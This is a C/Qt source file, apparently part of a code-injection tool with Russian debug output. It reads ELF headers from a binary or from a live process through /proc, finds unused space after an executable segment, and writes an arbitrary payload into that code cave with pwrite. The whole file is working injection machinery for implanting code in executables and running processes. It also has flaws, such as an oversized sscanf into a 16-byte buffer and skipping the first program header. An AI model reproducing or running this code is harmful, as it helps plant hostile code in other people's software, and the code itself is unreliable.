#include "core/injectMethods.h"
#include "core/inject.h"

#include <elf.h>
#include <fcntl.h>
#include <unistd.h>

#include <QDebug>

static int getProcAddr(char *target, struct TargetInfo *ti);


int saveFileTargetInfo(int fd, struct TargetInfo *ti) {
    ti->process_addr = 0;
    unsigned char magic[4];
    uint16_t file_type;

    if (pread(fd, magic, sizeof(magic), 0) == -1) {
        return 1;
    }

    if (!(magic[0] == 0x7F && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F')) {
        return 1;
    }

    if (pread(fd, &ti->ei_class, sizeof(ti->ei_class), 0x04) == -1) {
        return 1;
    }

    if (pread(fd, &file_type, sizeof(uint16_t), 0x10) == -1) {
        return 1;
    }

    if (file_type == 0x02) {
        ti->pic = false;
    } else if (file_type == 0x03) {
        ti->pic = true;
    } else {
        return 1;
    }
    
    if (ti->ei_class == 0x01) {
        if (pread(fd, &ti->ti32.e_entry, sizeof(ti->ti32.e_entry), 0x18) == -1) { return 1; }
        if (pread(fd, &ti->ti32.e_phoff, sizeof(ti->ti32.e_phoff), 0x1c) == -1) { return 1; }
        if (pread(fd, &ti->ti32.e_shoff, sizeof(ti->ti32.e_shoff), 0x20) == -1) { return 1; }
        
        if (pread(fd, &ti->e_phentsize, sizeof(ti->e_phentsize), 0x2a) == -1) { return 1; }
        if (pread(fd, &ti->e_phnum, sizeof(ti->e_phnum), 0x2c) == -1) { return 1; }
        if (pread(fd, &ti->e_shentsize, sizeof(ti->e_shentsize), 0x2e) == -1) { return 1; }
        if (pread(fd, &ti->e_shnum, sizeof(ti->e_shnum), 0x30) == -1) { return 1; }
        if (pread(fd, &ti->e_shstrndx, sizeof(ti->e_shstrndx), 0x32) == -1) { return 1; }

    } else if (ti->ei_class == 0x02) {
        if (pread(fd, &ti->ti64.e_entry, sizeof(ti->ti64.e_entry), 0x18) == -1) { return 1; }
        if (pread(fd, &ti->ti64.e_phoff, sizeof(ti->ti64.e_phoff), 0x20) == -1) { return 1; }
        if (pread(fd, &ti->ti64.e_shoff, sizeof(ti->ti64.e_shoff), 0x28) == -1) { return 1; }
        
        if (pread(fd, &ti->e_phentsize, sizeof(ti->e_phentsize), 0x36) == -1) { return 1; }
        if (pread(fd, &ti->e_phnum, sizeof(ti->e_phnum), 0x38) == -1) { return 1; }
        if (pread(fd, &ti->e_shentsize, sizeof(ti->e_shentsize), 0x3a) == -1) { return 1; }
        if (pread(fd, &ti->e_shnum, sizeof(ti->e_shnum), 0x3c) == -1) { return 1; }
        if (pread(fd, &ti->e_shstrndx, sizeof(ti->e_shstrndx), 0x3e) == -1) { return 1; }

    } else {
        return 1;
    }
    

    return 0;
}


int saveProcTargetInfo(int fd, struct TargetInfo *ti, char *target) {
    if (getProcAddr(target, ti)) {
        return 1;
    }

    if (pread(fd, &ti->ei_class, sizeof(ti->ei_class), ti->process_addr + 0x04) == -1) {
        return 1;
    }

    uint16_t e_type;
    if (pread(fd, &e_type, sizeof(e_type), ti->process_addr + 0x10) == -1) {
        return 1;
    }

    if (e_type == 0x02) { 
        ti->pic = false;        
    } else if (e_type == 0x03) {
        ti->pic = true;
    } else {
        return 1;
    }

    if (ti->ei_class == 0x01) {
        if (pread(fd, &ti->ti32.e_phoff, sizeof(ti->ti32.e_phoff), ti->process_addr + 0x1c) == -1) {
            return 1;
        }
        if (pread(fd, &ti->e_phentsize, sizeof(ti->e_phentsize), ti->process_addr + 0x2a) == -1) {
            return 1;
        }
        if (pread(fd, &ti->e_phnum, sizeof(ti->e_phnum), ti->process_addr + 0x2c) == -1) {
            return 1;
        }

    } else if (ti->ei_class == 0x02) {
        if (pread(fd, &ti->ti64.e_phoff, sizeof(ti->ti64.e_phoff), ti->process_addr + 0x20) == -1) {
            return 1;
        }
        if (pread(fd, &ti->e_phentsize, sizeof(ti->e_phentsize), ti->process_addr + 0x36) == -1) {
            return 1;
        }
        if (pread(fd, &ti->e_phnum, sizeof(ti->e_phnum), ti->process_addr + 0x38) == -1) {
            return 1;
        }

    } else {
        return 1;
    }

    return 0;
}

static int getProcAddr(char *target, struct TargetInfo *ti) {
    char buffer[256];
    char file_path[1024];
    char maps[] = "maps";
    char exe[] = "exe";

    snprintf(buffer, sizeof(buffer), "%s/%s", target, exe);

    ssize_t file_path_len = readlink(buffer, file_path, sizeof(file_path)-1);
    if (file_path_len == -1) {
        return 1;
    }
    
    file_path[file_path_len] = '\0';  
    
    snprintf(buffer, sizeof(buffer), "%s/%s", target, maps);

    FILE *file = fopen(buffer, "r");
    if (file == NULL) {
        return 1;
    }

    char line[1024];
    bool is_process_addr = false;
    
    while (fgets(line, sizeof(line), file) != NULL) { 
        char address_str[16];

        if (sscanf(line, "%30[^-]", address_str) != 1) {
            return 1;
        }

        if (strstr(line, file_path) != NULL && !is_process_addr) {
            ti->process_addr = strtoul(address_str, NULL, 16);
            is_process_addr = true;
        } 
    }

    fclose(file);
    return 0;
}

int injectPayload(int fd, struct TargetInfo *ti, struct Payload *payload) {
    for (uint16_t ph = 0; ph < ti->e_phnum; ph++ ) {

        if (ti->ei_class == 0x01) {
            ti->ti32.e_phoff += ti->e_phentsize;

            uint32_t p_type;
            uint32_t p_flags;
            
            if (pread(fd, &p_type, sizeof(p_type), ti->process_addr + ti->ti32.e_phoff) == -1) {
                return 1;
            }

            if (pread(fd, &p_flags, sizeof(p_flags), ti->process_addr + ti->ti32.e_phoff + 0x18) == -1) {
                return 1;
            }

            if (p_type == PT_LOAD && p_flags & PF_X) {
                uint32_t p_vaddr_next; // e_phoff совпадает с vaddr 
                if (pread(fd, &p_vaddr_next, sizeof(p_vaddr_next), ti->process_addr + ti->ti32.e_phoff + ti->e_phentsize + 0x08) == -1) {
                    return 1;
                }

                if (p_vaddr_next % 0x1000 == 0) {  
                    uint32_t p_vaddr;   
                    if (pread(fd, &p_vaddr, sizeof(p_vaddr), ti->process_addr + ti->ti32.e_phoff + 0x08) == -1) {
                        return 1;
                    }

                    if (pread(fd, &ti->ti32.addr_free, sizeof(ti->ti32.addr_free), ti->process_addr + ti->ti32.e_phoff + 0x10) == -1) {
                        return 1;
                    }
                    ti->ti32.addr_free += p_vaddr;

                    if (ti->ti32.addr_free + payload->size + 0x05 <= p_vaddr_next) { 
                        if (ti->pic) {
                            if (pwrite(fd, payload->addr, payload->size, ti->process_addr + ti->ti32.addr_free) == -1) {
                                return 1;
                            }
                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->process_addr + ti->ti32.addr_free, 8, 16, QLatin1Char('0')).toUpper();

                        } else {
                            if (pwrite(fd, payload->addr, payload->size, ti->ti32.addr_free) == -1) {
                                return 1;
                            }
                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->ti32.addr_free, 8, 16, QLatin1Char('0')).toUpper();
                        }

                        break;
                    }
                }
            }

        } else {
            ti->ti64.e_phoff += ti->e_phentsize;
            
            uint32_t p_type;
            uint32_t p_flags;

            if (pread(fd, &p_type, sizeof(p_type), ti->process_addr + ti->ti64.e_phoff) == -1) {
                return 1;
            }
            if (pread(fd, &p_flags, sizeof(p_flags), ti->process_addr + ti->ti64.e_phoff + 0x04) == -1) {
                return 1;
            }

            if (p_type == PT_LOAD && p_flags & PF_X) {
                uint64_t p_vaddr_next;      // e_phoff совпадает с vaddr 
                if (pread(fd, &p_vaddr_next, sizeof(p_vaddr_next), ti->process_addr + ti->ti64.e_phoff + ti->e_phentsize + 0x10) == -1) {
                    return 1;
                }

                if (p_vaddr_next % 0x1000 == 0) {  
                    uint64_t p_vaddr; 
                    if (pread(fd, &p_vaddr, sizeof(p_vaddr), ti->process_addr + ti->ti64.e_phoff + 0x10) == -1) {
                        return 1;
                    }

                    if (pread(fd, &ti->ti64.addr_free, sizeof(ti->ti64.addr_free), ti->process_addr + ti->ti64.e_phoff + 0x20) == -1) {
                        return 1;
                    }
                    ti->ti64.addr_free += p_vaddr;

                    if (ti->ti64.addr_free + payload->size + 0x14 <= p_vaddr_next) {   
                        if (ti->pic) {
                            if (pwrite(fd, payload->addr, payload->size, ti->process_addr + ti->ti64.addr_free) == -1) {
                                return 1;
                            }

                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->process_addr + ti->ti64.addr_free, 8, 16, QLatin1Char('0')).toUpper();
                        } else {
                            if (pwrite(fd, payload->addr, payload->size, ti->ti64.addr_free) == -1) {
                                return 1;
                            }

                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->ti64.addr_free, 8, 16, QLatin1Char('0')).toUpper();
                        }

                        break;
                    }
                }
            }
        }

    } 
    return 0;
}

